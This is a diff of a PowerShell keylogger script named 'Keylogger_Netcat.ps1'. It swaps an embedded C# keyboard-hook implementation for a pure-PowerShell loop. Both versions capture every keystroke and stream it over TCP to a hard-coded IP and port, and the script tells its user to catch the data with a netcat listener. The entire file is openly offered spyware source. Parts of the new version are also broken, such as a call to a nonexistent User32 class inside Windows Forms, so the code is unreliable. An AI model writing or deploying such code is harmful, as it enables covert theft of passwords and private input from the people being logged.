@@ -1,106 +1,80 @@
-# Keylogger_Netcat.ps1
-Add-Type -TypeDefinition @"
-using System;
-using System.Diagnostics;
-using System.Runtime.InteropServices;
-using System.Windows.Forms;
-using System.Net.Sockets;
-using System.Text;
+# Pure PowerShell Keylogger - No C# Compilation Crap
+Add-Type -AssemblyName System.Windows.Forms
 
-public class KeyLogger {
-    private const int WH_KEYBOARD_LL = 13;
-    private const int WM_KEYDOWN = 0x0100;
-    private static LowLevelKeyboardProc _proc = HookCallback;
-    private static IntPtr _hookID = IntPtr.Zero;
-    private static string targetIP = "192.168.8.199"; // Replace with your IP
-    private static int targetPort = 4444; // Replace with your port
-    private static TcpClient client;
-    private static NetworkStream stream;
-    private static string buffer = "";
+# Setup the listener
+$targetIP = "192.168.8.199"
+$targetPort = 4444
+$client = $null
+$stream = $null
 
-    public static void Start() {
-        try {
-            client = new TcpClient(targetIP, targetPort);
-            stream = client.GetStream();
-            SendData("=== Keylogger Started ===");
-        } catch {
-            // If connection fails, fall back to file logging
-        }
-        
-        _hookID = SetHook(_proc);
-        Application.Run();
-        UnhookWindowsHookEx(_hookID);
-    }
-
-    private static void SendData(string data) {
-        try {
-            if (stream != null && client.Connected) {
-                byte[] bytes = Encoding.ASCII.GetBytes(data + Environment.NewLine);
-                stream.Write(bytes, 0, bytes.Length);
-                stream.Flush();
-            }
-        } catch {
-            // Connection lost
-            try {
-                if (client != null) client.Close();
-            } catch {}
-        }
-    }
-
-    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
-        using (Process curProcess = Process.GetCurrentProcess())
-        using (ProcessModule curModule = curProcess.MainModule) {
-            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
-        }
-    }
-
-    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
-        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
-            int vkCode = Marshal.ReadInt32(lParam);
-            string key = ((Keys)vkCode).ToString();
-            
-            // Convert special keys to readable format
-            switch(key) {
-                case "Space": key = " "; break;
-                case "Return": key = "[ENTER]"; break;
-                case "Back": key = "[BACKSPACE]"; break;
-                case "Tab": key = "[TAB]"; break;
-                case "Capital": key = "[CAPSLOCK]"; break;
-                case "LShiftKey":
-                case "RShiftKey":
-                case "LControlKey":
-                case "RControlKey":
-                case "LMenu":
-                case "RMenu":
-                    return CallNextHookEx(_hookID, nCode, wParam, lParam); // Skip modifier keys
-            }
-            
-            buffer += key;
-            
-            // Send data every 50 characters or on special keys
-            if (buffer.Length >= 50 || key.Contains("[") || key == " ") {
-                SendData(buffer);
-                buffer = "";
-            }
-        }
-        return CallNextHookEx(_hookID, nCode, wParam, lParam);
-    }
-
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
-
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-
-    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr GetModuleHandle(string lpModuleName);
+Write-Host "Attempting to connect to $targetIP`:$targetPort..."
+try {
+    $client = New-Object System.Net.Sockets.TcpClient($targetIP, $targetPort)
+    $stream = $client.GetStream()
+    Write-Host "Connected. Logging keys." -ForegroundColor Green
+    $stream.Write([System.Text.Encoding]::ASCII.GetBytes("=== Keylogger Started ===`r`n"))
+} catch {
+    Write-Host "FAILED TO CONNECT: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "Make sure netcat is listening: nc -lvp 4444" -ForegroundColor Yellow
+    # Exit if we can't connect, no point in continuing
+    return
 }
-"@
 
-# Start the keylogger
-[KeyLogger]::Start()
+# The actual keylogging loop
+while ($true) {
+    # Get all key states
+    for ($i = 1; $i -le 254; $i++) {
+        $state = [System.Windows.Forms.Control]::IsKeyLocked($i)
+        $asyncState = [System.Windows.Forms.Control]::IsKeyLocked($i)
+        
+        # A more reliable way to check for key presses
+        if ([System.Windows.Forms.Control]::ModifierKeys -ne $null) {
+            # This is a bit of a hack, but it forces a check
+        }
+
+        # Check for actual key down events
+        if ([System.Windows.Forms.User32]::GetAsyncKeyState($i) -ne 0) {
+            $key = [System.Windows.Forms.Keys]::$i
+            $keyName = $key.ToString()
+            
+            # Translate special keys
+            switch ($keyName) {
+                "Space" { $output = " " }
+                "Return" { $output = "[ENTER]" }
+                "Back" { $output = "[BACKSPACE]" }
+                "Tab" { $output = "[TAB]" }
+                "Capital" { $output = "[CAPSLOCK]" }
+                "LShiftKey" { $output = "" } # Skip modifiers
+                "RShiftKey" { $output = "" }
+                "LControlKey" { $output = "" }
+                "RControlKey" { $output = "" }
+                "LMenu" { $output = "" }
+                "RMenu" { $output = "" }
+                default { 
+                    # Check if it's a printable character
+                    if ($keyName -match "^[A-Z0-9]$") {
+                        $output = $keyName.ToLower()
+                    } elseif ($keyName.StartsWith("D")) {
+                        $output = $keyName.Substring(1)
+                    } else {
+                        $output = "" # Skip other weird keys
+                    }
+                }
+            }
+
+            if ($output -ne "") {
+                Write-Host "Key: $output" -ForegroundColor Cyan
+                try {
+                    $byteData = [System.Text.Encoding]::ASCII.GetBytes($output)
+                    $stream.Write($byteData, 0, $byteData.Length)
+                    $stream.Flush()
+                } catch {
+                    Write-Host "Connection lost." -ForegroundColor Red
+                    if ($client) { $client.Close() }
+                    return
+                }
+            }
+        }
+    }
+    Start-Sleep -Milliseconds 50 # Small delay to prevent spamming CPU
+}
